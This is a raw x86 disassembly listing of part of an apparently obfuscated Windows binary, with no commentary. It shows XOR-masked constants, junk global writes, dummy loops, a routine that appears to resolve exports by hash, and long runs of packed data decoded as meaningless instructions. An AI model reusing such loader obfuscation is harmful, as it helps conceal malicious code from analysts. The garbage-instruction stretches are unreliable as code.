  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e7cc,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x4304d7,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ee59
  40cd16:	mov    eax,ds:0x43047d
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42edd7
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x43046d,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x4304e7,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e7c0,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x430471,0x42edcf
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x430439,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x43043d,0x430449
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42edcb
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x430449,0x0
  40cde2:	mov    eax,ds:0x430449
  40cde7:	inc    eax
  40cde8:	mov    ds:0x430449,eax
  40cded:	cmp    DWORD PTR ds:0x430449,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42eacf
  40ce06:	cmp    DWORD PTR ds:0x430449,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42edd7,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x4304cf,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ede3,0x4304df
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e7cc,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x43043d,0x17
  40ce7c:	cmp    DWORD PTR ds:0x43043d,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x43043d,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e7dc
  40cec0:	push   0x42e8e3
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42ec43
  40ced0:	cmp    DWORD PTR ds:0x43043d,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x43043d
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x43043d,edi
  40ceea:	mov    edi,DWORD PTR ds:0x43043d
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x43043d,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e7d4,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e7d4,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e7d4,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x43044d
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42ec47
  40cf36:	cmp    DWORD PTR ds:0x42e7d4,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e7d4
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e7d4,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42edef,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e7c4
  40cf7a:	sbb    DWORD PTR ds:0x430435,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x4304db,0x1f
  40cf95:	cmp    DWORD PTR ds:0x4304db,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x4304db,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42eddb
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42ea0f
  40cfbd:	cmp    DWORD PTR ds:0x4304db,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x4304db
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x4304db,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x4304db
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x4304db,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42edf3,0x11
  40cff9:	cmp    DWORD PTR ds:0x42edf3,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42edf3,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e7d8
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42ec4b
  40d024:	cmp    DWORD PTR ds:0x42edf3,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42edf3
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42edf3,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42edf3
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42edf3,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x430439,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x430439
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x430439,esi
  40d067:	cmp    DWORD PTR ds:0x430439,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42ea13
  40d087:	cmp    DWORD PTR ds:0x430439,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42eddb
  40d09f:	sub    DWORD PTR ds:0x42e7bc,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42eddf
  40d0b2:	xor    DWORD PTR ds:0x42ede7,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e7d4
  40d0c3:	or     DWORD PTR ds:0x430441,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42edf3
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x43044d,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42eddb,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x4304eb
  40d0ed:	xor    DWORD PTR ds:0x42eddf,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42edd7,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42edcf
  40d10b:	or     DWORD PTR ds:0x42eddb,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [ebp+0x2],ebp
  40d124:	lods   eax,DWORD PTR ds:[esi]
  40d125:	psubw  mm0,QWORD PTR [ecx+0x7f227e7e]
  40d12c:	jle    0x40d1ac
  40d12e:	icebp  
  40d12f:	retf   0x52ef
  40d132:	clc    
  40d133:	adc    al,0x22
  40d135:	jae    0x40d134
  40d137:	imul   DWORD PTR ds:0xee1601f5
  40d13d:	xor    DWORD PTR [edx],ebx
  40d13f:	aad    0x56
  40d141:	dec    ebx
  40d142:	inc    ebx
  40d143:	lods   eax,DWORD PTR ds:[esi]
  40d144:	xchg   ebx,eax
  40d145:	imul   edx,edi,0x7c
  40d148:	jno    0x40d16f
  40d14a:	and    al,0x61
  40d14c:	pop    esp
  40d14d:	das    
  40d14e:	aas    
  40d14f:	jl     0x40d150
  40d151:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d152:	ins    DWORD PTR es:[edi],dx
  40d153:	adc    ebp,DWORD PTR ds:0x9cfd94c2
  40d159:	ja     0x40d1d3
  40d15b:	adc    DWORD PTR [ecx],esi
  40d15d:	pop    ebp
  40d15e:	and    BYTE PTR [edx+0x71],bh
  40d161:	dec    esi
  40d162:	cld    
  40d163:	ins    BYTE PTR es:[edi],dx
  40d164:	and    eax,0xd38fdc89
  40d169:	scas   eax,DWORD PTR es:[edi]
  40d16a:	or     DWORD PTR [edx],eax
  40d16c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d16d:	test   eax,0x9166a361
  40d172:	push   edx
  40d173:	cld    
  40d174:	mov    al,ds:0x2a3ba6f1
  40d179:	xor    al,0x9e
  40d17b:	add    al,0x1b
  40d17d:	jp     0x40d1aa
  40d17f:	lock inc esi
  40d181:	(bad)  
  40d183:	dec    ebx
  40d184:	xchg   ecx,eax
  40d185:	xchg   DWORD PTR [ecx],esi
  40d187:	mov    bh,0xef
  40d189:	mov    bl,0x33
  40d18b:	or     eax,0x2c4fb596
  40d190:	cmc    
  40d191:	mov    dh,0xc3
  40d193:	adc    eax,DWORD PTR ds:0xd69f56d
  40d199:	inc    ecx
  40d19a:	mov    edi,0x1fa46623
  40d19f:	call   FWORD PTR [eax+0x23c0fa56]
  40d1a5:	test   BYTE PTR [eax+ebp*8+0x60],dh
  40d1a9:	lods   al,BYTE PTR ds:[esi]
  40d1aa:	dec    edx
  40d1ab:	icebp  
  40d1ac:	clc    
  40d1ad:	push   0xf429c2fa
  40d1b2:	les    eax,FWORD PTR [edx]
  40d1b4:	mov    ebx,0x230df8ca
  40d1b9:	push   esp
  40d1ba:	mov    dh,0xc5
  40d1bc:	lds    esi,FWORD PTR [ebx-0x25]
  40d1bf:	adc    al,0x82
  40d1c1:	and    al,0xac
  40d1c3:	mov    eax,0x95c8cfee
  40d1c8:	repz push ebx
  40d1ca:	push   ss
  40d1cb:	mov    esi,0x6856cef0
  40d1d0:	loop   0x40d16b
  40d1d2:	ficomp DWORD PTR [ebp-0x20]
  40d1d5:	sbb    dh,ah
  40d1d7:	mov    eax,ds:0x5da13dd0
  40d1dc:	rcl    DWORD PTR [eax+0x1081e8c8],1
  40d1e2:	and    esp,ecx
  40d1e4:	bound  esp,QWORD PTR [edx]
  40d1e6:	cmp    ah,bh
  40d1e8:	or     ch,bl
  40d1ea:	xchg   ebp,eax
  40d1eb:	aas    
  40d1ec:	adc    eax,0xa4483a8e
  40d1f1:	dec    ecx
  40d1f2:	push   ebp
  40d1f3:	jle    0x40d1e4
  40d1f5:	repnz (bad) 
  40d1f7:	xchg   esp,eax
  40d1f8:	push   ebx
  40d1f9:	jg     0x40d1e3
  40d1fb:	add    al,0x7c
  40d1fd:	mov    WORD PTR [edx-0x4e],gs
  40d200:	or     al,0xb2
  40d202:	arpl   bx,bx
  40d204:	(bad)  
  40d205:	ficom  DWORD PTR [eax+0x1beb4e43]
  40d20b:	repnz retf 0x66de
  40d20f:	or     DWORD PTR [edi+ebx*4-0x507be784],edi
  40d216:	cs mov ebx,0xa16d113b
  40d21c:	xor    eax,0xe8270ce2
  40d221:	adc    DWORD PTR [ecx+ebp*4-0x7e8df376],eax
  40d228:	out    dx,al
  40d229:	dec    ebp
  40d22a:	stos   DWORD PTR es:[edi],eax
  40d22b:	xchg   ebp,eax
  40d22c:	mov    BYTE PTR [ebx-0x58e3b2e1],bh
  40d232:	mov    edx,0xbfeaeb84
  40d237:	cmp    esi,DWORD PTR [edi-0x1]
  40d23a:	push   esp
  40d23b:	out    dx,eax
  40d23c:	idiv   bh
  40d23e:	fld    QWORD PTR [ebx+0x13]
  40d241:	push   ecx
  40d242:	mov    bh,al
  40d244:	mov    DWORD PTR [esp+ebx*2],esp
  40d247:	int    0x8f
  40d249:	dec    ecx
  40d24a:	jne    0x40d22f
  40d24c:	cmp    DWORD PTR [esi],eax
  40d24e:	jle    0x40d27b
  40d250:	into   
  40d251:	mov    al,ds:0x733d6fd1
  40d256:	dec    ebp
  40d257:	push   esp
  40d258:	jb     0x40d1ed
  40d25a:	add    ecx,ebx
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x4304e7
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ede7,0x42e7c4
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42edef,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42eddf,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42edd7,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x430439,0x430445
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x4304df
  40d2bf:	add    DWORD PTR ds:0x42edd7,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e96f
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x430465,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x43045d,0x42edd3
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e7c4,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x430449,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x430465,0x43043d
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e7c4,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42edeb,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x430449,0x4304d3
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x430435,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x43044d,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x430461,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x43045d,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x43045d
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x43045d,ecx
  40d38d:	cmp    DWORD PTR ds:0x43045d,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x430441
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42ead3
  40d3b2:	cmp    DWORD PTR ds:0x43045d,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0xb06a8e30
  40d410:	cmp    eax,DWORD PTR [edx+0x7e8ead6c]
  40d416:	jle    0x40d43a
  40d418:	jg     0x40d498
  40d41a:	jle    0x40d3b3
  40d41c:	inc    ebp
  40d41d:	loopne 0x40d3c1
  40d41f:	dec    edi
  40d420:	in     al,dx
  40d421:	fwait
  40d422:	push   edx
  40d423:	jle    0x40d436
  40d425:	test   eax,0xbf913997
  40d42a:	imul   BYTE PTR [ecx-0x2e2a8554]
  40d430:	xchg   ecx,eax
  40d431:	sbb    BYTE PTR [ebx+0x45],cl
  40d434:	sbb    DWORD PTR [eax+ebx*2],edx
  40d437:	xor    DWORD PTR ds:[edi],esp
  40d43a:	retf   
  40d43b:	shr    dl,cl
  40d43d:	push   ss
  40d43e:	xchg   BYTE PTR [ecx+0x58a1db45],ch
  40d444:	cmp    DWORD PTR ds:0xecddbd9,edi
  40d44a:	add    eax,0xa4fa1989
  40d44f:	repnz fld DWORD PTR [ebp-0x35]
  40d454:	out    0xa1,eax
  40d456:	(bad)  
  40d457:	jmp    0x4917f8cd
  40d45c:	xchg   BYTE PTR [ebx-0x4067dc6a],al
  40d462:	aaa    
  40d463:	sub    BYTE PTR [edi+0x8cb4899],dh
  40d469:	cld    
  40d46a:	xor    al,0x1e
  40d46c:	pop    edi
  40d46d:	repnz mov al,ds:0x5974c84c
  40d473:	out    0x45,eax
  40d475:	or     ebx,DWORD PTR [ebx-0x4b867e94]
  40d47b:	xlat   BYTE PTR ds:[ebx]
  40d47c:	stc    
  40d47d:	mov    al,0xb4
  40d47f:	jne    0x40d461
  40d481:	aas    
  40d482:	push   edx
  40d483:	enter  0x1b2b,0xbc
  40d487:	jl     0x40d4a8
  40d489:	sub    BYTE PTR [esi+ebp*4-0x74ed0207],0x85
  40d491:	mov    edi,0x4033db5
  40d496:	inc    ebp
  40d497:	push   esi
  40d498:	cmp    eax,0x46a2b27c
  40d49d:	jmp    0xbf8211c2
  40d4a2:	imul   esp,DWORD PTR [edx-0x7f],0x3
  40d4a6:	lods   eax,DWORD PTR ds:[esi]
  40d4a7:	xor    eax,esp
  40d4a9:	test   dl,bh
  40d4ab:	xor    edi,DWORD PTR [eax-0x7f]
  40d4ae:	cli    
  40d4af:	fwait
  40d4b0:	enter  0xce6f,0x12
  40d4b4:	(bad)  
  40d4b5:	scas   eax,DWORD PTR es:[edi]
  40d4b6:	and    al,0x59
  40d4b8:	hlt    
  40d4b9:	rcl    BYTE PTR [ecx+0x46],1
  40d4bc:	mov    cs,edi
  40d4be:	push   edx
  40d4bf:	(bad)  
  40d4c1:	push   0xfbde974a
  40d4c6:	adc    al,0x73
  40d4c8:	push   esi
  40d4c9:	jo     0x40d4c6
  40d4cb:	xor    ebx,DWORD PTR [ebx-0x1b]
  40d4ce:	and    cl,BYTE PTR [edi]
  40d4d0:	out    0x72,al
  40d4d2:	mov    al,ds:0x26e82a17
  40d4d7:	add    esi,DWORD PTR [edx+0x2d]
  40d4da:	sub    al,0x9c
  40d4dc:	mov    bl,BYTE PTR ds:0xb10a6353
  40d4e2:	retf   0xdce9
  40d4e5:	mov    ah,BYTE PTR [edx+0x1edea7b7]
  40d4eb:	ds mov esi,0xa054b3d1
  40d4f1:	xor    al,0xa4
  40d4f3:	mov    eax,ds:0x90529891
  40d4f8:	cmc    
  40d4f9:	mov    bh,0x64
  40d4fb:	and    BYTE PTR [esi+ecx*4+0x23],bl
  40d4ff:	ins    DWORD PTR es:[edi],dx
  40d500:	cwde   
  40d501:	add    BYTE PTR [ebx-0x4ced43d2],ah
  40d507:	out    dx,eax
  40d508:	sub    BYTE PTR [eax+0x40],bl
  40d50b:	add    ebp,DWORD PTR [eax+0x63]
  40d50e:	add    DWORD PTR [edi+0x4c],ebp
  40d511:	push   edi
  40d512:	dec    ebx
  40d513:	xchg   DWORD PTR [eax-0x63],esp
  40d516:	jecxz  0x40d565
  40d518:	push   ebp
  40d519:	sbb    eax,DWORD PTR [ebp+0x65]
  40d51c:	or     cl,BYTE PTR ss:[eax]
  40d51f:	sbb    BYTE PTR [edx-0x1f],ch
  40d522:	jns    0x40d50f
  40d524:	(bad)
  40d527:	jecxz  0x40d566
  40d529:	aas    
  40d52a:	push   edx
  40d52b:	jbe    0x40d4ba
  40d52d:	das    
  40d52e:	adc    eax,ebx
  40d530:	jae    0x40d54e
  40d532:	enter  0x911e,0xec
  40d536:	or     dh,BYTE PTR [edx-0xd]
  40d539:	lds    ebp,FWORD PTR ds:0x901616aa
  40d53f:	push   ds
  40d540:	scas   al,BYTE PTR es:[edi]
  40d541:	pop    ecx
  40d542:	sahf   
  40d543:	jge    0x40d513
  40d545:	mov    ds:0xc75ff46,al
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	or     eax,0x518afd51
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d55e
  40d5c4:	(bad)  
  40d5c5:	or     eax,0x8fb43c52
  40d5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5cb:	(bad)  
  40d5cc:	fsubr  DWORD PTR [eax-0x1b]
  40d5cf:	mov    ds:0x4923a999,eax
  40d5d4:	push   0x17cd13d9
  40d5d9:	in     eax,dx
  40d5da:	lds    edx,FWORD PTR [ebp-0x4e]
  40d5dd:	inc    edi
  40d5de:	xchg   DWORD PTR [ebx-0x65705673],edx
  40d5e4:	dec    ebx
  40d5e5:	push   ds
  40d5e6:	out    0x98,al
  40d5e8:	js     0x40d56e
  40d5ea:	lods   eax,DWORD PTR ds:[esi]
  40d5eb:	push   ss
  40d5ec:	dec    edx
  40d5ed:	lahf   
  40d5ee:	icebp  
  40d5ef:	inc    edi
  40d5f0:	push   ebx
  40d5f1:	fidiv  DWORD PTR [edx-0x1874223c]
  40d5f7:	mov    al,0x1c
  40d5f9:	(bad)  
  40d5fa:	mov    dh,0xd6
  40d5fc:	adc    al,0xd0
  40d5fe:	pop    es
  40d5ff:	xor    eax,0x2b21c0c
  40d604:	(bad)  
  40d605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d606:	xor    eax,0x35cf5f5a
  40d60b:	and    eax,0x4b5ac6b8
  40d610:	inc    ebx
  40d611:	xor    ecx,DWORD PTR [ebx-0x10ef99ce]
  40d617:	xor    esp,edx
  40d619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d61a:	call   0x6ad1:0xd67ef16f
  40d621:	jbe    0x40d5bb
  40d623:	fmul   QWORD PTR [edi+0x43]
  40d626:	dec    edx
  40d627:	jns    0x40d68b
  40d629:	das    
  40d62a:	clc    
  40d62b:	lock dec edi
  40d62d:	xchg   ecx,eax
  40d62e:	mov    ecx,0x2a3efd05
  40d633:	mov    dh,0x3d
  40d635:	in     al,0x7e
  40d637:	icebp  
  40d638:	loope  0x40d61a
  40d63a:	int3   
  40d63b:	xor    edi,DWORD PTR [esi-0xb]
  40d63e:	rcr    esp,1
  40d640:	shr    DWORD PTR [edi-0x38],1
  40d643:	adc    dh,BYTE PTR [ecx-0x5c]
  40d646:	add    ch,0xf8
  40d649:	test   BYTE PTR [ecx-0x47d81178],al
  40d64f:	aas    
  40d650:	cs into 
  40d652:	pop    ds
